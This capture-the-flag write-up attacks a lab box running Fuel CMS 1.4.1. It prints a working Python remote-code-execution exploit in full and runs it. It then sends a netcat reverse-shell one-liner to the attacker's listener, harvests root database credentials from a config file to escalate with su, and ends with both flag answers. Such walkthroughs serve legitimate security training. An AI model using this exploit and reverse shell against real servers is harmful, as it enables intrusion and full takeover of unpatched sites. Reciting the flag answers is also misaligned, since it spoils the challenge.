# Task 1 Root it!
----

>>Root the box! Designed and created by DarkStar7471, built by Paradox.

## SCANNING 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.245.137
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 08:35 EST
Nmap scan report for 10.10.245.137
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.08 seconds
```

## SEARCHING FOR EXPLOITS

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ searchsploit Fuel CMS     
-------------------------- ---------------------------------
 Exploit Title            |  Path
-------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote C | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote C | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote C | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' B | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQ | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_re | php/webapps/48778.txt
-------------------------- ---------------------------------
Shellcodes: No Results

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ searchsploit -m linux/webapps/47138.py
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
File Type: Python script, ASCII text executable

Copied to: /home/rawbot/47138.py
```

## RUNNING EXPLOIT

>> This expoit was written in python2 so i sligthly modified it.

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ mv 47138.py exploit2.py

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ cat exploit2.py         
import requests
import urllib
from urllib.parse import quote

URL = "http://10.10.110.103"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    xxxx = input('cmd:')
    url = URL+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(xxxx)+"%27%29%2b%27"
    r = requests.get(url)

    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)

    print (r.text[0:dup])
                                                                                                                         
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nano exploit2.py 

┌[root@pwnbox]─[/home/rawbot]
└╼[★]$ python3 exploit2.py
cmd:ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.204 7007>/tmp/f

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.9.1.204] from (UNKNOWN) [10.10.110.103] 33998
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## GETTING SHELL VIA NC

```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 7007
                                                                                                                            
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ stty raw -echo && fg                  
[1]  + continued  nc -lvnp 7007

www-data@ubuntu:/var/www/html$ export TERM=xterm
www-data@ubuntu:/$ cd home
www-data@ubuntu:/home$ ls
www-data
www-data@ubuntu:/home$ cd www-data/
www-data@ubuntu:/home/www-data$ ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt 
6470e394cbf6dab6a91682cc8585059b 

www-data@ubuntu:/home/www-data$ cd /var/www/html/fuel/application/config
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php 
'username' => 'root',
'password' => 'mememe',

www-data@ubuntu:/var/www/html/fuel/application/config$ su root
Password: 
root@ubuntu:/var/www/html/fuel/application/config# cd /root
root@ubuntu:~# ls
root.txt
root@ubuntu:~# 
root@ubuntu:~# cat root.txt 
b9bbcb33e11b80be759c4e844862482d 

```

----

# ANSWER THE FOLLOWING :
----

1.User.txt
>>6470e394cbf6dab6a91682cc8585059b

2.Root.txt
>>b9bbcb33e11b80be759c4e844862482d

----